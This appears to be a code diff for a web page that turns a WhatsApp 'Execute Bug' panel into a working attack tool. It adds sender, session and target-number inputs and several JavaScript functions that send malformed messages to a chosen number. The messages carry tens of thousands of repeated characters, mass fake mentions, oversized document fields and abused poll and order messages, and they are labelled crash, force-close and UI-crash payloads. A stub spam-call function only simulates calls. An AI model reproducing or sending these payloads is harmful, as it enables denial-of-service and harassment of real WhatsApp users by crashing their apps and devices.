@@ -383,6 +383,37 @@
             transform: translateY(0);
         }
         
+        .sender-section {
+            background: rgba(10, 10, 10, 0.85);
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255, 58, 94, 0.2);
+        }
+        
+        .sender-input-group {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 10px;
+        }
+        
+        .sender-input-group input {
+            flex: 1;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            font-size: 0.9rem;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .sender-input-group input:focus {
+            outline: none;
+            border-color: #ff3a5e;
+            background: rgba(255, 255, 255, 0.15);
+        }
+        
         .whatsapp-input {
             display: flex;
             max-width: 600px;
@@ -449,6 +480,37 @@
             box-shadow: 0 5px 15px rgba(255, 58, 94, 0.3);
         }
         
+        .status-log {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            max-height: 150px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 0.9rem;
+            border: 1px solid rgba(255, 58, 94, 0.3);
+        }
+        
+        .log-entry {
+            margin-bottom: 5px;
+            padding: 5px;
+            border-left: 3px solid #ff3a5e;
+            background: rgba(255, 58, 94, 0.1);
+        }
+        
+        .log-success {
+            color: #4CAF50;
+        }
+        
+        .log-error {
+            color: #ff3a5e;
+        }
+        
+        .log-info {
+            color: #2196F3;
+        }
+        
         footer {
             text-align: center;
             padding: 30px 0;
@@ -513,6 +575,10 @@
             .whatsapp-input button {
                 border-radius: 8px;
                 width: 100%;
+            }
+            
+            .sender-input-group {
+                flex-direction: column;
             }
             
             .action-buttons {
@@ -631,11 +697,26 @@
             </div>
             
             <div class="whatsapp-section" id="whatsappSection">
-                <h3 class="section-title">Enter WhatsApp Number</h3>
+                <h3 class="section-title">Execute Bug</h3>
+                
+                <div class="sender-section">
+                    <h4 style="color: #ff3a5e; margin-bottom: 15px; text-align: center;">Sender WhatsApp Configuration</h4>
+                    <div class="sender-input-group">
+                        <input type="text" id="senderNumber" placeholder="Sender WhatsApp number (e.g., 628123456789)">
+                    </div>
+                    <div class="sender-input-group">
+                        <input type="text" id="sessionId" placeholder="Session ID (optional)">
+                    </div>
+                </div>
+                
                 <p style="text-align: center; margin-bottom: 10px;">Select a bug type above and enter the target WhatsApp number</p>
                 <div class="whatsapp-input">
-                    <input type="text" placeholder="Enter target WhatsApp number...">
-                    <button>Execute Bug</button>
+                    <input type="text" id="targetNumber" placeholder="Enter target WhatsApp number...">
+                    <button id="executeButton">Execute Bug</button>
+                </div>
+                
+                <div class="status-log" id="statusLog">
+                    <div class="log-entry log-info">Ready to execute bug...</div>
                 </div>
             </div>
         </div>
@@ -693,6 +774,200 @@
         `;
         document.head.appendChild(style);
         
+        // Bug Functions
+        async function DansExecuteCrash(target, ptcp = true) {   
+            const trigger = "𑇂DansExecute𑆵𑆴𑆿".repeat(60000);
+            const mentionedList = [
+            target, ...Array.from({ length: 35000 }, () =>
+              `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
+              )
+            ];
+            
+            try {
+                const message = {
+                    botInvokeMessage: {
+                        message: {
+                            newsletterAdminInviteMessage: {
+                                newsletterJid: '1@newsletter',
+                                newsletterName: trigger,
+                                jpegThumbnail: null,
+                                caption: trigger,
+                                inviteExpiration: 9999999999999,
+                            },
+                        },
+                    },
+                    nativeFlowMessage: {},
+                    contextInfo: {
+                      remoteJid: target,
+                      participant: target,
+                      mentionedJid: mentionedList,
+                      disappearingMode: {
+                        initiator: "CHANGED_IN_CHAT",
+                        trigger: "CHAT_SETTING"
+                      }
+                    },
+                };
+
+                await client.relayMessage(target, message, {
+                  userJid: target,
+                });
+                return { success: true, message: `CRASH IOS executed on ${target}` };
+            } catch (error) {
+                return { success: false, message: `Error: ${error.message}` };
+            }
+        }
+
+        async function DansExecuteForclose(DansExecute, target) {
+          try {
+            const delay = (ms) => new Promise(res => setTimeout(res, ms));
+            
+            // 1. ContextInfo Mentions Spam + CallLog
+            await DansExecute.sendMessage(target, {
+              callLogMessage: {
+                callType: 'miss',
+                duration: 99999,
+                timestamp: Date.now()
+              },
+              contextInfo: {
+                mentionedJid: Array(250).fill(target),
+                forwardingScore: 9999,
+                isForwarded: true
+              }
+            });
+            await delay(2500);
+
+            // 2. DocumentMessage Payload Kosong
+            await DansExecute.sendMessage(target, {
+              documentMessage: {
+                fileName: 'CRASH_PAYLOAD_V1.pdf',
+                mimetype: 'application/pdf',
+                fileLength: 999999999,
+                url: 'https://files.catbox.moe/xnu6qm.png'
+              },
+              contextInfo: {}
+            });
+            await delay(2500);
+
+            // 3. NativeFlowMessage Kosong + Mention Ganda
+            await DansExecute.sendMessage(target, {
+              interactiveMessage: {
+                nativeFlowMessage: {
+                  buttons: []
+                }
+              },
+              contextInfo: {
+                mentionedJid: Array(100).fill('0@s.whatsapp.net'),
+                forwardingScore: 500,
+                isForwarded: true
+              }
+            });
+            await delay(2500);
+
+            // 4. Poll Message Abuse
+            await DansExecute.sendMessage(target, {
+              pollCreationMessage: {
+                name: 'DansExecute' + '꧁'.repeat(200),
+                options: Array(50).fill({ optionName: '꧂'.repeat(50) }),
+                selectableCount: 9
+              }
+            });
+            await delay(2500);
+
+            // 5. Order Message Kosong
+            await DansExecute.sendMessage(target, {
+              orderMessage: {
+                itemCount: 9999,
+                status: 1,
+                surface: 1,
+                orderTitle: 'Crash Order' + '꧁'.repeat(100),
+                message: ' ',
+                thumbnail: Buffer.alloc(0)
+              }
+            });
+
+            return { success: true, message: `FORCLOSE BETA executed on ${target}` };
+          } catch (err) {
+            return { success: false, message: `Error: ${err.message}` };
+          }
+        }
+
+        async function UiDansExecute(target) {
+            const messagePayload = {
+                groupMentionedMessage: {
+                    message: {
+                        interactiveMessage: {
+                            header: {
+                                documentMessage: {
+                                        url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
+                                        mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
+                                        fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
+                                        fileLength: "999999999999",
+                                        pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
+                                        mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
+                                        fileName: `🎀𝐃𝐚𝐧𝐬𝐄𝐱𝐞𝐜𝐮𝐭𝐞🎀 ‌‌‌𝐗‌‌𝐒 - 𝐉𝐮𝐧𝐧 🦠`,
+                                        fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
+                                        directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
+                                        mediaKeyTimestamp: "1715880173"
+                                    },
+                                hasMediaAttachment: true
+                            },
+                            body: {
+                                    text: "妥🎀𝐃𝐚𝐧𝐬𝐄𝐱𝐞𝐜𝐮𝐭𝐞🎀 ‌‌‌𝐗‌‌𝐒 - 𝐉𝐮𝐧𝐧 🦠楤" + "ꦾ".repeat(150000) + "@1".repeat(250000)
+                            },
+                            nativeFlowMessage: {},
+                            contextInfo: {
+                                    mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
+                                    groupMentions: [{ groupJid: "1@newsletter", groupSubject: "DansExecute" }],
+                                isForwarded: true,
+                                quotedMessage: {
+                documentMessage: {
+                   url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+                   mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+                   fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+                   fileLength: "999999999999",
+                   pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
+                   mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
+                   fileName: "ZUTSUZO is here",
+                   fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
+                   directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+                   mediaKeyTimestamp: "1724474503",
+                   contactVcard: true,
+                   thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
+                   thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
+                   thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
+                   jpegThumbnail: "",
+              }
+                            }
+                            }
+                        }
+                    }
+                }
+            };
+
+            try {
+                DansExecute.relayMessage(target, messagePayload, {}, { messageId: null });
+                return { success: true, message: `CRASH UI executed on ${target}` };
+            } catch (error) {
+                return { success: false, message: `Error: ${error.message}` };
+            }
+        }
+
+        async function SpamCall(target) {
+            try {
+                // Simulate spam call functionality
+                const delay = (ms) => new Promise(res => setTimeout(res, ms));
+                
+                for (let i = 0; i < 5; i++) {
+                    await delay(1000);
+                    // Simulate call attempt
+                }
+                
+                return { success: true, message: `SPAM CALL executed on ${target}` };
+            } catch (error) {
+                return { success: false, message: `Error: ${error.message}` };
+            }
+        }
+
         // Initialize main content after login
         function initializeMainContent() {
             // Get elements
@@ -703,6 +978,10 @@
             const video = document.querySelector('.thumbnail-video');
             const volumeSlider = document.getElementById('volumeSlider');
             const volumeToggle = document.getElementById('volumeToggle');
+            const executeButton = document.getElementById('executeButton');
+            const statusLog = document.getElementById('statusLog');
+            
+            let selectedBugType = null;
             
             // Set volume maksimum (1.0 = 100%)
             video.volume = 1.0;
